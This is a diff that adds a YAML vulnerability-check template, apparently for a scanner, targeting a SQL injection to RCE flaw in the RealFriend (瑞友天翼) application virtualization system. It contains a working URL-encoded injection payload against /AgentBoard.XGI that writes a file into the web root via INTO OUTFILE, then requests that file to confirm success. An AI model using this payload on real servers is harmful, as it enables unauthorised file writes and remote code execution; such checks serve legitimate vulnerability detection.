@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 瑞友天翼应用虚拟化系统sql注入RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /AgentBoard.XGI?user=%27%7C%7C%271%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27C%3A%2FRealFriend%2FRap%20Server%2FWebRoot%2Ftest1.php%27%20LINES%20TERMINATED%20BY%200x313233--%20-&cmd=UserLogin
+  headers:
+  data:
+response1:
+requests2:
+  method: GET
+  path: /test1.php
+response2:
+  code: 200
+
+
+
+
